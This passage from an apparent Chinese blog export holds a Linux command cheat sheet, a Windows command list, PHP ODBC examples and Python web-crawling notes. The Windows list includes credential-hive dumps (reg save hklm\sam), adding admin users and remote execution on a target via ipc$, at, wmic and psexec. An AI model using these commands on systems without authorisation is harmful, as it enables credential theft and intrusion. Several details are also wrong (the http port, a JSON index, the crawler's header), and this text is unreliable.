file1 压缩一个叫做 ‘file1’ 的文件gunzip file1.gz 解压一个叫做 ‘file1.gz’的文件gzip file1 压缩一个叫做 ‘file1’的文件gzip -9 file1 最大程度压缩rar a file1.rar test_file 创建一个叫做 ‘file1.rar’ 的包rar x file1.rar 解压rar包unrar x file1.rar 解压rar包dpkg -i package.deb 安装/更新一个 deb 包dpkg -r package_name 从系统删除一个 deb 包dpkg -l 显示系统中所有已经安装的 deb 包dpkg -l | grep httpd 显示所有名称中包含 “httpd” 字样的deb包dpkg -s package_name 获得已经安装在系统中一个特殊包的信息dpkg -L package_name 显示系统中已经安装的一个deb包所提供的文件列表dpkg –contents package.deb 显示尚未安装的一个包所提供的文件列表tar zcvf +压缩文件名 压缩文件tar zxvf +解压包名 解压文件tar -jcvf renwolesshel.tar.bz2 打包tar jxvf renwolesshel.tar.bz2 解压zip -q -r renwolesshel.zip renwolesshel/ 解压zip格式的压缩包unzip renwolesshel.zipwhich 加软件名 可以查出软件目录在哪./+文件名或者apt-get +文件名 安装文件</code></pre><h3 id="3-系统信息"><a href="#3-系统信息" class="headerlink" title="3.系统信息"></a>3.系统信息</h3><pre><code>arch 显示机器的处理器架构(1)uname -m 显示机器的处理器架构(2)uname -r 显示正在使用的内核版本cat /proc/version 显示内核的版本cat /proc/net/dev 显示网络适配器及统计cat /proc/cpuinfo 显示CPU info的信息cat /proc/mounts 显示已加载的文件系统</code></pre><h3 id="4-vi-常用命令"><a href="#4-vi-常用命令" class="headerlink" title="4.vi 常用命令"></a>4.vi 常用命令</h3><p>vi编辑器分为三种状态，分别是：<br>1.命令模式（command mode）<br>控制屏幕光标的移动，字符、字或行的删除，移动复制某区段及进入Insert mode下，或者到 last line mode。<br>2.插入模式（Insert mode）<br>只有在Insert mode下，才可以做文字输入，按「ESC」键可回到命令行模式。<br>3.底行模式（last line mode）<br>将文件保存或退出vi，也可以设置编辑环境，如寻找字符串、列出行号……等。</p><pre><code>**打开**vi filename :打开或新建文件，并将光标置于第一行首vi +n filename ：打开文件，并将光标置于第n行首vi + filename ：打开文件，并将光标置于最后一行首**编辑**i 在当前位置生前插入I 在当前行首插入a 在当前位置后插入A 在当前行尾插入o 在当前行之后插入一行O 在当前行之前插入一行编辑结束，按Esc返回命令模式**基本查找**/text　　查找text，按n健查找下一个，按N健查找前一个。?text　　查找text，反向查找，按n健查找下一个，按N健查找前一个。查找很长的词，如果一个词很长，键入麻烦，可以将光标移动到该词上，按*或#键即可以该单词进行搜索，相当于/搜索。而#命令相当于?搜索。**删除**删除当前行 dd删除2行 2dd**拷贝和粘贴**yy 拷贝当前行nyy 拷贝当前后开始的n行，比如2yy拷贝当前行及其下一行。p  在当前光标后粘贴区块拷贝1. 将光标移动到要复制的文本开始的地方，按 v进入可视模式。2. 将光标移动到要复制的文本的结束的地方，按y复制。此时vim会自动将光标定位到选中文本的开始的地方，并退出可视模式。3. 我移动光标到文本结束的地方，按 p粘贴。**退出命令**:wq 保存并退出:q! 强制退出并忽略所有更改:e! 放弃所有修改，并打开原来文件:w保存修改**显示行号**set numberset nu输入:n，代表跳转到第n行，如:100，就跳转到第100行。撤销操作u——&gt; vim与vi的区别——&gt; vim是vi的延申 vim编辑源码会高亮 vim的命令对vi是完全兼容的</code></pre><h3 id="5-文件搜索"><a href="#5-文件搜索" class="headerlink" title="5.文件搜索"></a>5.文件搜索</h3><pre><code>find / -name file1 从 ‘/’ 开始进入根文件系统搜索文件和目录find / -user user1 搜索属于用户 ‘user1’ 的文件和目录find /home/user1 -name *.bin 在目录 ‘/ home/user1’ 中搜索带有’.bin’ 结尾的文件find /usr/bin -type f -atime +100 搜索在过去100天内未被使用过的执行文件find /usr/bin -type f -mtime -10 搜索在10天内被创建或者修改过的文件find . -name &#39;*.php&#39; -mmin -30  查找最近30分钟修改的当前目录下的.php文件find . -name &#39;*.php&#39; -mtime 0  查找最近24小时修改的当前目录下的.php文件find . -name &#39;*.inc&#39; -mtime 0 -ls  查找最近24小时修改的当前目录下的.php文件，并列出详细信息find . -type f -mtime 1  查找当前目录下，最近24-48小时修改过的常规文件。find . -type f -mtime +1  查找当前目录下，最近1天前修改过的常规文件。-atime 文件访问时间-ctime 文件常见时间-mtime文件修改时间-mtime n : n为数字，意思为在n天之前的“一天之内”被更改过内容的文件-mtime +n : 列出在n天之前（不含n天本身）被更改过内容的文件名-mtime -n : 列出在n天之内（含n天本身）被更改过内容的文件名-type f 代表一个普通格式的文件 二进制文件-type d 代表文件夹find / -name *.rpm -exec chmod 755 ‘&#123;&#125;’ ; 搜索以 ‘.rpm’ 结尾的文件并定义其权限--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--文件中r w x -的含义:r是只读权限，w是写的权限，x是可执行权限,-是没有任何权限。目录中r w x的含义:r具有ls权限，w是在目录上可以增加、删除、创建权限，x是具有ls –l权限。权限     读    写   执行        读    写   执行      读   写   执行字符     r     w     x           r     w    x         r    w    x数字     4     2     1           4     2    1         4    2    1分配     对象文件所有者          文件所属组用户         其他用户chmod 777 +文件名 给单独文件赋所有权限chmod -R 777 /home/user  表示将整个/home/user目录与其中的文件和子目录的权限都设置为rwxrwxrwx常用权限-rw------- (600) 只有所有者才有读和写的权限-rw-r--r-- (644) 只有所有者才有读和写的权限，组群和其他人只有读的权限-rwx------ (700) 只有所有者才有读，写，执行的权限-rwxr-xr-x (755) 只有所有者才有读，写，执行的权限，组群和其他人只有读和执行的权限-rwx--x--x (711) 只有所有者才有读，写，执行的权限，组群和其他人只有执行的权限-rw-rw-rw- (666) 每个人都有读写的权限-rwxrwxrwx (777) 每个人都有读写和执行的权限也可以使用字母模式chmod +x 和chmod a+x 是一样的，一般没有明确要求，可以就用chmod +xu代表用户   g代表用户组   o代表其它   a代表所有创建一个文件只有用户具有完全控制的权限touch 文件名chmod u+rwx 文件名 当前用户加全部的权限chmod g-r 文件名   群组把读取权限去掉chmod o-r 文件名   其他用户读取权限去掉--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--find / -xdev -name *.rpm 搜索以 ‘.rpm’ 结尾的文件，忽略光驱、捷盘等可移动设备locate *.ps 寻找以 ‘.ps’ 结尾的文件 - 先运行 ‘updatedb’ 命令whereis halt 显示一个二进制文件、源码或man的位置which halt 显示一个二进制文件或可执行文件的完整路径grep kali /etc/passwd grep关键词搜索find / -name moonsec 2&gt;/dev/null   搜索某个文件/文件夹 屏蔽出错信息</code></pre><h3 id="6-用户和群组"><a href="#6-用户和群组" class="headerlink" title="6.用户和群组"></a>6.用户和群组</h3><pre><code>groupadd group_name 创建一个新用户组groupdel group_name 删除一个用户组cat /etc/group | grep group_name usermod -a -G moontea k1把用户k1附加其他用户组useradd moonsecpasswd moonsecuseradd -r -m -s /bin/bash moonsec参数的意思：-r 建立系统账号-m 自动建立用户的登入目录-s /bin/bash 指定用户登入后所使用的shellsu - root 切换到root用户su 用户名 切换到普通用户</code></pre><h3 id="7-系统管理"><a href="#7-系统管理" class="headerlink" title="7.系统管理"></a>7.系统管理</h3><pre><code>top  查看正在指向的程序信息ps -ef 查看所有进程信息ps -ef | grep tomcat 查找指定进程kill -9 id 强制杀死进程env 当前的变量查看系统变量echo $PATHhostname 查看主机名history 查看历史命令</code></pre><h3 id="8-查看磁盘信息"><a href="#8-查看磁盘信息" class="headerlink" title="8.查看磁盘信息"></a>8.查看磁盘信息</h3><pre><code>df   默认不带单位，挂载点、总容量、已用、可用df  -h   友好显示（带单位），很多命令的友好显示都是-h</code></pre><h3 id="9-查看内存信息"><a href="#9-查看内存信息" class="headerlink" title="9.查看内存信息"></a>9.查看内存信息</h3><pre><code>free   默认以KB为单位，总容量、已用、可用、缓存大小free  -m   默认以MB为单位free  -h   上面2种都不带单位、只显示数值，这种是友好显示的，会带单位G、M等</code></pre><h3 id="10-查看环境变量"><a href="#10-查看环境变量" class="headerlink" title="10.查看环境变量"></a>10.查看环境变量</h3><pre><code>echo  $JAVA_HOMEecho $PATH | grep jdk</code></pre><h3 id="11-开机自启"><a href="#11-开机自启" class="headerlink" title="11.开机自启"></a>11.开机自启</h3><p>有很多程序往往都需要设置开机自启，比如tomcat、mysql、nginx等。</p><pre><code>vim /etc/rc.d/rc.local   在/etc/rc.d/rc.local文件中加入开机要自动执行的程序mount -t smbfs -o username=user,password=pass //WinClient/share /mnt/share   挂载一个windows网络共享</code></pre><h3 id="12-网卡配置"><a href="#12-网卡配置" class="headerlink" title="12.网卡配置"></a>12.网卡配置</h3><pre><code>vi /etc/network/interfacesauto eth0                     //指定网卡（根据ifconfig结果修改）iface eth0 inet static        //启动静态ipaddress 192.168.0.66          // 设置静态ipnetmask 255.255.255.0         //子网掩码gateway 192.168.0.1           //指定网关service networking restart    //重启网络systemctl restart networking  //重启网络ifconfig eth0 192.168.0.33    //设置临时ip</code></pre><h3 id="13网卡DNS服务器"><a href="#13网卡DNS服务器" class="headerlink" title="13网卡DNS服务器"></a>13网卡DNS服务器</h3><pre><code>vi /etc/resovl.confnameserver 114.114.114.114重启网卡service networking restartsystemctl restart networking注意有时候重启才生效</code></pre><h3 id="14-服务相关"><a href="#14-服务相关" class="headerlink" title="14.服务相关"></a>14.服务相关</h3><pre><code>apache2服务器打开：/etc/init.d/apache2 start 重启：/etc/init.d/apache2 restart关闭：/etc/init.d/apache2 stop/etc/init.d/network start  启动网卡echo 1 &gt; /proc/sys/net/ipv4/ip_forward  开启路由转发</code></pre><h3 id="15-linux常用网络命令"><a href="#15-linux常用网络命令" class="headerlink" title="15.linux常用网络命令"></a>15.linux常用网络命令</h3><p>网络和监控命令类似于这些： hostname, ping, ifconfig, iwconfig, netstat, nslookup, traceroute, finger, telnet, ethtool<br>用于查看 linux 服务器 ip 地址，管理服务器网络配置，通过 telnet 和 ethernet 建立与 linux 之间的网络链接，查看 linux 的服务器信息等。</p><pre><code>hostname 查看本机名ping  一般用于测试网络是否通 内网icmpping www.baidu.com -c 3 执行3次ifconfig 网卡信息iwconfig 用于配置或获取无线网络设备信息netstat -a (all)显示所有选项，默认不显示LISTEN相关-t (tcp)仅显示tcp相关选项-u (udp)仅显示udp相关选项-n 拒绝显示别名，能显示数字的全部转化成数字。-l 仅列出有在 Listen (监听) 的服務状态-p 显示建立相关链接的程序名-r 显示路由信息，路由表-e 显示扩展信息，例如uid等-s 按各个协议进行统计-c 每隔一个固定时间，执行该netstat命令。提示：LISTEN和LISTENING的状态只有用-a或者-l才能看到netstat -ano-an 查看当前所有已连接端口-nlpt 查看当前所有tcp端口-nlpu 查看当前所有udp端口-nlpt | grep 80 查看所有80端口使用情况netstat -lntup 查看所有的tcp和upd端口nslookup 查询其他记录直接查询返回的是A记录，我们可以指定参数，查询其他记录，比如AAAA、MX等。nslookup -qt=type domain [dns-server]其中，type可以是以下这些类型：A 地址记录AAAA 地址记录AFSDB Andrew文件系统数据库服务器记录ATMA ATM地址记录CNAME 别名记录HINFO 硬件配置记录，包括CPU、操作系统信息ISDN 域名对应的ISDN号码MB 存放指定邮箱的服务器MG 邮件组记录MINFO 邮件组和邮箱的信息记录MR 改名的邮箱记录MX 邮件服务器记录NS 名字服务器记录PTR 反向记录RP 负责人记录RT 路由穿透记录SRV TCP服务器信息记录TXT 域名对应的文本信息X25 域名对应的X.25地址记录traceroute-d 使用Socket层级的排错功能。-f 设置第一个检测数据包的存活数值TTL的大小。-F 设置勿离断位。-g 设置来源路由网关，最多可设置8个。-i 使用指定的网络界面送出数据包。-I 使用ICMP回应取代UDP资料信息。-m 设置检测数据包的最大存活数值TTL的大小。-n 直接使用IP地址而非主机名称。-p 设置UDP传输协议的通信端口。-r 忽略普通的Routing Table，直接将数据包送到远端主机上。-s 设置本地主机送出数据包的IP地址。-t 设置检测数据包的TOS数值。-v 详细显示指令的执行过程。-w 设置等待远端主机回报的时间。-x 开启或关闭数据包的正确性检验。(traceroute是用来检测发出数据包的主机到目标主机之间所经过的网关数量的工具。)(traceroute的原理是试图以最小的TTL（存活时间）发出探测包来跟踪数据包到达目标主机所经过的网关，然后监听一个来自网关ICMP的应答。发送数据包的大小默认为38个字节。)telnetLinux telnet命令用于远端登入。执行telnet指令开启终端机阶段作业，并登入远端主机。现在多数用于检测某个端口是否开放FingerFinger是一种用户信息分享服务。它工作在TCP 79端口，可以用来公开用户的特定信息。Nmap的finger的脚本可以向Finger服务器发送请求，查询并获取用户的相关信息，如登录名、用户名、TTY类型、登录时间等。ethtool 是用于查询及设置网卡参数的命令</code></pre><h3 id="16-防火墙iptables"><a href="#16-防火墙iptables" class="headerlink" title="16.防火墙iptables"></a>16.防火墙iptables</h3><pre><code>iptalbes -L  查看防火墙规则iptables -F   清除规则/etc/init.d/iptables stop   关闭防火墙service iptables stop安装：apt-get install ufw关闭：ufw disable # To disable the firewall开启：ufw enable # To enable the firewall</code></pre>]]></content>
      
      
      <categories>
          
          <category> 附录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 附录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows常用命令</title>
      <link href="/2022/11/20/Windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2022/11/20/Windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h3 id="Windows常用命令"><a href="#Windows常用命令" class="headerlink" title="Windows常用命令"></a>Windows常用命令</h3><pre><code>ifconfig /all 获取获取域名、IP地址、DHCP服务器、网关、MAC地址、主机名net time /domain 查看域名、时间net view /domain 查看域内所有共享net view ip 查看对方局域网内开启了哪些共享net config workstation 查看域名、机器名等net user 用户名 密码 /add 建立用户net user 用户名 /del #删除用户net user guest /active:yes 激活guest账户net user 查看账户net user 账户名 查看指定账户信息net user /domain 查看域内有哪些用户，Windows NT Workstation 计算机上可用，由此可以此判断用户是否是域成员。net user 用户名 /domain 查看账户信息net group /domain 查看域中的组net group &quot;domain admins&quot; /domain 查看当前域的管理用户query user 查看当前在线的用户net localgroup 查看所有的本地组net localgroup administrators 查看administrators组中有哪些用户net localgroup administrators 用户名 /add 把用户添加到管理员组中net start 查看开启服务net start 服务名 开启某服务net stop 服务名 停止某服务net share 查看本地开启的共享net share ipc$ 开启ipc$共享net share ipc$ /del 删除ipc$共享net share c$ /del 删除C：共享\\192.168.0.108\c 访问默认共享c盘dsquery server 查看所有域控制器dsquery subnet 查看域内内子网dsquery group 查看域内工作组dsquery site 查看域内站点netstat -a 查看开启了哪些端口,常用netstat -annetstat -n 查看端口的网络连接情况，常用netstat -annetstat -v 查看正在进行的工作netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况）netstat -s 查看正在使用的所有协议使用情况nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写reg save hklm\sam sam.hive 导出用户组信息、权限配置reg save hklm\system system.hive 导出SYSKEYnet use \\目标IP\ipc$ 密码 /u:用户名 连接目标机器at \\目标IP 21:31 c:\server.exe 在某个时间启动某个应用wmic /node:&quot;目标IP&quot; /password:&quot;123456&quot; /user:&quot;admin&quot; 连接目标机器psexec.exe \\目标IP -u username -p password -s cmd 在目标机器上执行cmdfinger username @host 查看最近有哪些用户登陆route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interfacearp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a 将显示出全部信息nslookup IP地址侦测器tasklist 查看当前进程taskkill /pid PID数 终止指定PID进程whoami 查看当前用户及权限systeminfo 查看计算机信息（版本，位数，补丁情况）ver 查看计算机操作系统版本tasklist /svc 查看当前计算机进程情况netstat -ano 查看当前计算机进程情况wmic product &gt; ins.txt 查看安装软件以及版本路径等信息，重定向到ins.txt</code></pre>]]></content>
      
      
      <categories>
          
          <category> 附录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 附录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ODBC数据库</title>
      <link href="/2022/11/19/ODBC%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2022/11/19/ODBC%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h5 id="此章节是拓展阅读，选择性食用"><a href="#此章节是拓展阅读，选择性食用" class="headerlink" title="此章节是拓展阅读，选择性食用"></a>此章节是拓展阅读，选择性食用</h5><p>概念:ODBC 是一种应用程序编程接口(API)，使我们有能力连接到某个数据源。</p><h4 id="创建-ODBC-连接"><a href="#创建-ODBC-连接" class="headerlink" title="创建 ODBC 连接"></a>创建 ODBC 连接</h4><p>通过一个 ODBC 连接，可以连接到网络中的任何计算机上的任何数据库。<br>创建到达 MS Access 数据库的 ODBC 连接的方法:<br>1.在控制面板中打开管理工具图标。<br>2.双击其中的数据源(ODBC)图标。<br>3.选择系统 DSN 选项卡。<br>4.点击系统 DSN 选项卡中的添加。<br>5.选择Microsoft Access Driver。点击完成。<br>6.在下一个界面，点击选择来定位数据库。<br>7.为数据库起一个数据源名(DSN)。<br>8.点击确定。</p><p>注意:必须在您的网站所在的计算机上完成这个配置。<br>如果您的计算机上正在运行 Internet 信息服务(IIS)，上面的指令将会生效。<br>但是如果您的网站位于远程服务器，您必须拥有对该服务器的物理访问权限，或者请您的主机提供商为您建立 DSN。</p><h4 id="连接-ODBC"><a href="#连接-ODBC" class="headerlink" title="连接 ODBC"></a>连接 ODBC</h4><pre><code>实例下面的实例创建了到达名为 link 的 DSN 的连接，没有用户名和密码。然后创建并执行一条 SQL 语句：$conn=odbc_connect(&#39;link&#39;,&#39;&#39;,&#39;&#39;);           //数据源名、用户名、密码以及可选的指针类型$sql=&quot;SELECT * FROM customers&quot;;$rs=odbc_exec($conn,$sql);                  //执行 SQL 语句</code></pre><h4 id="取回记录"><a href="#取回记录" class="headerlink" title="取回记录"></a>取回记录</h4><p>从结果集中返回记录。如果能够返回行，则函数返回 true，否则返回 false。</p><pre><code>该函数有两个参数：ODBC 结果标识符和可选的行号:odbc_fetch_row ( resource $result_id [, int $row_number = 1 ] )</code></pre><h4 id="从记录中取回字段"><a href="#从记录中取回字段" class="headerlink" title="从记录中取回字段"></a>从记录中取回字段</h4><p>从记录中读取字段。该函数有两个参数:ODBC 结果标识符和字段编号或名称。</p><pre><code>$compname=odbc_result($rs,1);                             //从记录中返回第一个字段的值$compname=odbc_result($rs,&quot;CompanyName&quot;);                 //返回名为 &quot;CompanyName&quot; 的字段的值</code></pre><h4 id="关闭-ODBC-连接"><a href="#关闭-ODBC-连接" class="headerlink" title="关闭 ODBC 连接"></a>关闭 ODBC 连接</h4><p> odbc_close($conn); </p><h4 id="全过程示例"><a href="#全过程示例" class="headerlink" title="全过程示例"></a>全过程示例</h4><pre><code> &lt;?php $conn=odbc_connect(&#39;northwind&#39;,&#39;&#39;,&#39;&#39;);            //连接 ODBC if (!$conn)                                       //验证链接 &#123;exit(&quot;Connection Failed: &quot; . $conn);&#125;            //失败的回显 $sql=&quot;SELECT * FROM customers&quot;;                   //创建链接 $rs=odbc_exec($conn,$sql);                        //执行 SQL 语句 if (!$rs) &#123;exit(&quot;Error in SQL&quot;);&#125;                           //判断是否连接正常 echo &quot;&lt;table&gt;&lt;tr&gt;&quot;; echo &quot;&lt;th&gt;Companyname&lt;/th&gt;&quot;;                      //回显 echo &quot;&lt;th&gt;Contactname&lt;/th&gt;&lt;/tr&gt;&quot;; while (odbc_fetch_row($rs))                       //取回记录 &#123; $compname=odbc_result($rs,&quot;CompanyName&quot;);         //从记录中取回字段compname $conname=odbc_result($rs,&quot;ContactName&quot;);          //从记录中取回字段compname echo &quot;&lt;tr&gt;&lt;td&gt;$compname&lt;/td&gt;&quot;;  echo &quot;&lt;td&gt;$conname&lt;/td&gt;&lt;/tr&gt;&quot;; &#125; odbc_close($conn);                                //关闭 ODBC 连接 echo &quot;&lt;/table&gt;&quot;; ?&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 附录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 附录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于面向对象的Python爬虫</title>
      <link href="/2022/11/19/20221119/"/>
      <url>/2022/11/19/20221119/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="基于面向对象的Python爬虫"><a href="#基于面向对象的Python爬虫" class="headerlink" title="基于面向对象的Python爬虫"></a>基于面向对象的Python爬虫</h4><pre><code>import urllib.requestimport reclass GetHtml(object):    def __init__(self,URL,HEAD):      //初始化        self.url=URL        self.head=HEAD        def get_index(self):              //获取主页信息        self.request=urllib.request.Request(self.url)        self.request.add_header(&#39;user-agent&#39;,self.request)        self.response=urllib.request.urlopen(self.request)        return self.response.read()        def get_list(self):               //获取符合条件的列表        self.strimglist=[]        self.imglist=re.findall(b&#39;匹配条件&#39;,self.get_index())        for i in self.imglist:            self.strimglist.append(self.url+str(i,encoding=&#39;utf8&#39;))        return self.strimglist        def get_image(self):              //下载资源        num=0        for self.url in self.get_list():            num+=1            with open(str(num)+&#39;后缀&#39;,&#39;wb&#39;) as file:                file.write(self.get_index())html=GetHtml(&#39;目标地址&#39;,&#39;请求头&#39;)html.get_list()</code></pre><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="有阳光、还感觉冷。如果我忍住这个秘密、温暖冬天就会遥遥而无期。"><a href="#有阳光、还感觉冷。如果我忍住这个秘密、温暖冬天就会遥遥而无期。" class="headerlink" title="有阳光、还感觉冷。如果我忍住这个秘密、温暖冬天就会遥遥而无期。"></a>有阳光、还感觉冷。如果我忍住这个秘密、温暖冬天就会遥遥而无期。</h5>]]></content>
      
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面向对象</title>
      <link href="/2022/11/18/20221118/"/>
      <url>/2022/11/18/20221118/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="面向对象编程"><a href="#面向对象编程" class="headerlink" title="面向对象编程"></a>面向对象编程</h4><p>类:设计<br>对象:实例</p><h4 id="类的命名"><a href="#类的命名" class="headerlink" title="类的命名"></a>类的命名</h4><p>驼峰命名法</p><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><pre><code>class 类名:    属性(变量) = 值    def 函数名(self):         //方法(函数),一定要写self        执行代码对象名=类名()                 //创建对象对象名.函数()                 //调用对象</code></pre><h4 id="魔法方法"><a href="#魔法方法" class="headerlink" title="魔法方法"></a>魔法方法</h4><p>通常格式为__方法名__</p><pre><code>def __init__(self,值):    self.属性=值如果值也是一个变量就能随时传参进行更改</code></pre><h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><p>1.定义类class<br>2.创建内存空间,定义属性和方法<br>3.实例化类,创建对象<br>4.调用类的方法</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="风吹落最后一片叶，"><a href="#风吹落最后一片叶，" class="headerlink" title="风吹落最后一片叶，"></a>风吹落最后一片叶，</h5><h5 id="我的心也飘着雪，"><a href="#我的心也飘着雪，" class="headerlink" title="我的心也飘着雪，"></a>我的心也飘着雪，</h5><h5 id="爱只能往回忆里堆叠。"><a href="#爱只能往回忆里堆叠。" class="headerlink" title="爱只能往回忆里堆叠。"></a>爱只能往回忆里堆叠。</h5>]]></content>
      
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python爬虫一篇就够了</title>
      <link href="/2022/11/17/20221117/"/>
      <url>/2022/11/17/20221117/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="Python爬虫思路"><a href="#Python爬虫思路" class="headerlink" title="Python爬虫思路"></a>Python爬虫思路</h4><p>1.发送请求获取网站html代码<br>2.过滤有效信息<br>3.解析数据<br>4.处理数据</p><h4 id="爬取过程"><a href="#爬取过程" class="headerlink" title="爬取过程"></a>爬取过程</h4><p>1.找到网站发起请求<br>2.分析url并提取<br>3.分析url并解释网络内容<br>4.存储数据并获取新url<br>5.判断是否满足停止条件0</p><h4 id="robots协议"><a href="#robots协议" class="headerlink" title="robots协议"></a>robots协议</h4><p>决定可以访问的user(允许爬取的user)</p><h4 id="http与https"><a href="#http与https" class="headerlink" title="http与https"></a>http与https</h4><p>http端口是8080<br>https加密,SSL层,端口是443</p><h4 id="URL与URI"><a href="#URL与URI" class="headerlink" title="URL与URI"></a>URL与URI</h4><p>url包括协议类型，主机名/域名，端口号，查找路径，查找参数，锚点<br>uri是utl请求之前部分</p><h4 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h4><p>get不影响资源/post影响资源</p><h4 id="请求头参数"><a href="#请求头参数" class="headerlink" title="请求头参数"></a>请求头参数</h4><p>user-agent:浏览器名称<br>referer:请求源头<br>cookie:用于判断用户身份</p><h4 id="常见响应状态码"><a href="#常见响应状态码" class="headerlink" title="常见响应状态码"></a>常见响应状态码</h4><p>200:正常返回<br>301:永久重定向<br>404:url错误<br>418:反爬虫，解决响应<br>500:服务器错误，bug</p><h4 id="请求交互过程"><a href="#请求交互过程" class="headerlink" title="请求交互过程"></a>请求交互过程</h4><p>1.客户端浏览器向服务器发送请求<br>2.网站接收请求处理后返回响应数据<br>3.浏览器解析源码</p><h4 id="开发者工具"><a href="#开发者工具" class="headerlink" title="开发者工具"></a>开发者工具</h4><p>element:分析网页结构，获取数据<br>console:打印输出网站信息<br>network:查看网络请求<br>source:所有的源文件(只能查看静态数据)</p><h4 id="Session与Cookie原理"><a href="#Session与Cookie原理" class="headerlink" title="Session与Cookie原理"></a>Session与Cookie原理</h4><p>【Session】<br>特点:可长时间保存会话<br>过程:<br>1.客户端第一次发送请求时服务器端创建Session对象(生成sessionID)<br>2.将sessionID存入cookie传回<br>3.下次发送请求时包含sessionID<br>【Cookie】<br>特点:从服务器发送给浏览器后一直保存到关闭浏览器<br>过程:<br>1.创建cookie<br>2.设置存储cookie<br>3.发送cookie<br>4.读取cookie</p><h4 id="JSON-数据交换语言"><a href="#JSON-数据交换语言" class="headerlink" title="JSON(数据交换语言)"></a>JSON(数据交换语言)</h4><p>JavaScript ObjectNotation，JS对象标记<br>数据格式:<br>1.对象表示为键值对<br>2.数据用逗号分隔<br>3.花括号保存对象<br>4.方括号保存数组<br>整体上与python的字典相似<br>例:</p><pre><code>json_yuju=&#123;&#39;name&#39;:&#39;python&#39;,&#39;address&#39;:&#123;&#39;province&#39;:&#39;guangdong&#39;,&#39;city&#39;:[&#39;guangzhou&#39;,&#39;huizhou&#39;]&#125;&#125;print(json_yuju[&#39;address&#39;][&#39;city&#39;][2])               //输出huizhou</code></pre><h4 id="Ajax-Web数据交互方式"><a href="#Ajax-Web数据交互方式" class="headerlink" title="Ajax(Web数据交互方式)"></a>Ajax(Web数据交互方式)</h4><p>Ajax在服务器与浏览器之间使用异步数据传输(可以只请求少量信息)<br>Ajax技术独立于浏览器与平台<br>Ajax一般返回JSON(对Ajax地址进行post或get就可以返回JSON数据)<br>Ajax渲染到html的叫做动态数据<br>服务器后台生成的是静态数据<br>html中的在source中没有找到那就是ajax<br>注意:Ajax需要用户允许JavaScript在浏览器上执行</p><h4 id="urllib"><a href="#urllib" class="headerlink" title="urllib"></a>urllib</h4><p>py自带的网络请求库<br>模块:<br>urllib.request打开并读取url</p><pre><code>模拟浏览器发送请求并获取响应结果data默认为None即Get请求，post请求时要将data以字典形式存储，由字典类型转换成字节类型转换成的数据类型看网页源代码【GET】import urllib.requesturl=&#39;https......&#39;                           //传入urlresponse=urllib.request.urlopen(url)        //发送get请求html=response.read().decode(&#39;gbk&#39;)          //读取响应并将数据类型转为strprint(html)【POST】import urllib.requesturl=&#39;https......&#39;                           //传入urldata=&#123;&#39;a&#39;:&#39;A&#39;,&#39;b&#39;:&#39;B&#39;,&#39;action&#39;:&#39;login&#39;&#125;     //从Form Data处查看response=urllib.request.urlopen(url,data=bytes(urllib.prase.urlencode(data),encoding=&#39;utf-8&#39;))html=response.read().decode(&#39;gbk&#39;)          //读取响应并将数据类型转为strprint(html)【通过伪造请求头绕过418】import urllib.requesturl=&#39;https......&#39;                           //传入urlheader=&#123;&#39;User-Agent&#39;:&#39;浏览器信息&#39;&#125;request=urllib.request.Request(url,headers=header)response=urllib.request.urlopen(request)html=response.read().decode(&#39;utf-8&#39;)        //读取响应并将数据类型转为strprint(html)</code></pre><p>urllib.error包含提出的异常urllib.request</p><pre><code>import urllib.requestimport urllib.errorurl=&#39;目标地址&#39;try:    response=urllib.request.urlopen(url)    //尝试链接expect urllib.error.URLError as e:          //捕获返回信息    print(e.reason)</code></pre><p>urllib.parse解析url</p><pre><code>import urllib.parsea=&#123;&#39;A&#39;:&#39;内容&#39;&#125;                              //创建键值对result1=urllib.parse.urlencode(a)           //url编码result2=urllib.prase.unquote(result1)       //url解码属性:code:请求返回的状态码reason:返回错误的原因headers:请求返回的响应头信息</code></pre><p>urllib.robotparase解析robots.txt文件</p><h4 id="IP代理"><a href="#IP代理" class="headerlink" title="IP代理"></a>IP代理</h4><p>网站会拒绝同一IP多次访问<br>命令行中输入ipconfig的IPv4是本地IP<br>分类:<br>1.透明代理，知道使用了且知道源IP<br>2.匿名代理，知道使用了但是不知道源IP<br>3.高匿代理，都不知道<br><a href="https://www.xicidaili.com/nn/">免费网站</a><br>语法:</p><pre><code>from urllib.request import build_openerfrom urllib.request import 